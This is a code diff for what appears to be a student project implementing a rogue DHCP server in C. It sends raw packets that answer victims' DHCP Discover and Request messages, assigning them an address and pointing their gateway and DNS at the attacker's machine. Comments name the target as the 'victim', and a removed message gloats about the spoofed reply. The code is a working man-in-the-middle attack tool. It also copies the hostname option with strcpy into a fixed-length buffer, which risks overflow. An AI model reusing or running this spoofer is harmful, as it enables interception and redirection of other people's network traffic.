@@ -1,19 +1,39 @@
+#include <linux/tcp.h>
+#include <linux/udp.h>
+#include <net/if.h>
+#include <netinet/ether.h>
+#include <netinet/in.h>
+#include <netinet/ip.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <net/if.h>
-#include <netinet/ether.h>
-#include <netinet/ip.h>
 #include <linux/if_packet.h>
-#include <linux/udp.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
 #include <arpa/inet.h>
+#include <pthread.h>
 #include <unistd.h>
-#include "dhcp.h"
-#include "spoofer.h"
-#include "checksum.h"
+#include "monitor.h"
 
-static void
-fill_ethernet()
+#include "dhcp.h"
+#include "checksum.h"
+#include "bensocket.h"
+
+int first = 1;
+int second = 0;
+
+unsigned char send_buffer[350];
+
+char *ip_str;
+int ip_int;
+
+int on;
+struct ifreq ifr;
+struct ifreq mac_address;
+struct ifreq ip_address;
+pthread_t receiver_thread, report_thread;
+
+void fill_ethernet()
 {
 	struct ether_header* header;
 	header  = (struct ether_header*) send_buffer;
@@ -27,14 +47,13 @@ fill_ethernet()
 	}
 }
 
-static void
-fill_ip()
+void fill_ip()
 {
 	struct iphdr* header;
 	header = (struct iphdr*) (send_buffer + sizeof(struct ether_header));
 
 	//TODO: Change this to get correct ip from machine and fake ip for victim.
-	char* dst_addr="192.168.86.120";
+	char *dst_addr="192.168.25.120";
 
 	header->ihl = 5;
 	header->version = 4;
@@ -46,11 +65,10 @@ fill_ip()
 	header->check = in_cksum((unsigned short *)header, sizeof(struct iphdr));
 }
 
-static void
-fill_udp()
+void fill_udp()
 {
 	struct udphdr* header;
-	header  = (struct udphdr*) (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
+	header  = (struct udphdr*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr)));
 
 	header->source = htons(67);
 	header->dest = htons(68);
@@ -58,8 +76,7 @@ fill_udp()
 	header->check = htons(0);
 }
 
-static void
-copy_ip(unsigned char* new_ip)
+void copy_ip(unsigned char* new_ip)
 {
 	new_ip[0] = (ip_int >> 24) & 255;
 	new_ip[1] = (ip_int >> 16) & 255;
@@ -67,8 +84,7 @@ copy_ip(unsigned char* new_ip)
 	new_ip[3] = ip_int & 255;
 }
 
-static void
-set_magic_cookie(unsigned char* options)
+void set_magic_cookie(unsigned char* options)
 {
 	options[0]=0x63;
 	options[1]=0x82;
@@ -76,24 +92,21 @@ set_magic_cookie(unsigned char* options)
 	options[3]=0x63;
 }
 
-static void
-set_dhcp_message_type(unsigned char* options, unsigned char type)
+void set_dhcp_message_type(unsigned char* options, unsigned char type)
 {
 	options[0]=53;
 	options[1]=1;
 	options[2]=type;
 }
 
-static void
-set_dhcp_server_identifier(unsigned char* options)
+void set_dhcp_server_identifier(unsigned char* options)
 {
 	options[0]=54;
 	options[1]=4;
 	copy_ip(&options[2]);
 }
 
-static void
-set_dhcp_subnet_mask(unsigned char* options)
+void set_dhcp_subnet_mask(unsigned char* options)
 {
 	options[0]=1;
 	options[1]=4;
@@ -103,8 +116,7 @@ set_dhcp_subnet_mask(unsigned char* options)
 	options[5]=0;
 }
 
-static void
-set_dhcp_address_lease_time(unsigned char* options)
+void set_dhcp_address_lease_time(unsigned char* options)
 {
 	options[0]=51;
 	options[1]=4;
@@ -114,24 +126,21 @@ set_dhcp_address_lease_time(unsigned char* options)
 	options[5]=128;
 }
 
-static void
-set_dhcp_router(unsigned char* options)
+void set_dhcp_router(unsigned char* options)
 {
 	options[0]=3;
 	options[1]=4;
 	copy_ip(&options[2]);
 }
 
-static void
-set_dhcp_dns(unsigned char* options)
+void set_dhcp_dns(unsigned char* options)
 {
 	options[0]=6;
 	options[1]=4;
 	copy_ip(&options[2]);
 }
 
-static void
-set_dhcp_broadcast(unsigned char* options)
+void set_dhcp_broadcast(unsigned char* options)
 {
 	options[0]=28;
 	options[1]=4;
@@ -141,8 +150,7 @@ set_dhcp_broadcast(unsigned char* options)
 	options[5]=255;
 }
 
-static void
-fill_dhcp(unsigned char type)
+void fill_dhcp(unsigned char type)
 {
 	struct dhcp_packet* header;
 	header = (struct dhcp_packet*)  (send_buffer + (sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr)));
@@ -155,9 +163,8 @@ fill_dhcp(unsigned char type)
 	header->secs = 0;
 	header->flags = 0;
 
-	//TODO: Change this to get correct ip from machine and fake ip for victim.
 	header->ciaddr = dhcp_header->ciaddr;
-	inet_aton("192.168.86.120", &header->yiaddr);
+	inet_aton("192.168.25.120", &header->yiaddr);
 	header->siaddr = dhcp_header->siaddr;
 	header->giaddr = dhcp_header->giaddr;
 
@@ -177,8 +184,7 @@ fill_dhcp(unsigned char type)
 	header->options[43]=0xff;
 }
 
-void
-send_dhcp(unsigned char type)
+void send_dhcp(unsigned char type)
 {
 	fill_ethernet();
 	fill_ip();
@@ -190,25 +196,67 @@ send_dhcp(unsigned char type)
 	socklen_t len;
 	unsigned char addr[6];
 
-	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
-	{
+	if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)  {
 		printf("Erro na criacao do socket.\n");
-		exit(1);
-	}
+        exit(1);
+ 	}
 
 	to.sll_protocol= htons(ETH_P_ALL);
 	to.sll_halen = 6;
-	to.sll_ifindex = 3; // interface index on which packets will be sent
+	to.sll_ifindex = 3; /* indice da interface pela qual os pacotes serao enviados */
 	size_t i;
 	for ( i = 0; i < 6; i++)
-	{
 		addr[i] = eth_header->ether_shost[i];
-	}
 
 	memcpy (to.sll_addr, addr, 6);
 	len = sizeof(struct sockaddr_ll);
 
+	/*if (first)*/
+	/*{*/
+		/*FILE* f = fopen("first", "w");*/
+		/*fwrite(send_buffer, BUFFSIZE, 1, f);*/
+		/*fclose(f);*/
+		/*second = 1;*/
+	/*}*/
+	/*if (second)*/
+	/*{*/
+		/*FILE* f = fopen("second", "w");*/
+		/*fwrite(send_buffer, BUFFSIZE, 1, f);*/
+		/*fclose(f);*/
+		/*second = 0;*/
+	/*}*/
 	sendto(sock, (char *) send_buffer, sizeof(send_buffer), 0, (struct sockaddr*) &to, len);
-	printf("( ͡° ͜ʖ ͡°) Mandei o DHCP safado\n");
 	close(sock);
+}
+
+void dhcp_handler()
+{
+	unsigned char *options = dhcp_header->options;
+	int i = 4;
+	while (true) {
+		unsigned char type = options[i++];
+		if (type == 255)
+			break;
+		unsigned char len = options[i++];
+		if (type == 53) {
+			if (options[i] == 1) {
+				send_dhcp(2);
+			} else if (options[i] == 3) {
+				send_dhcp(5);
+			}
+		}
+		if (type == 12) {
+			hostname = malloc(len + 1);
+			strcpy(hostname, (const char*)&options[i]);
+			hostname[len] = '\0';
+		}
+		i+=len;
+	}
+}
+
+void udp_handler()
+{
+	unsigned int port_dest = (unsigned int)ntohs(udp_header->dest);
+	if (port_dest == 67)
+		dhcp_handler();
 }
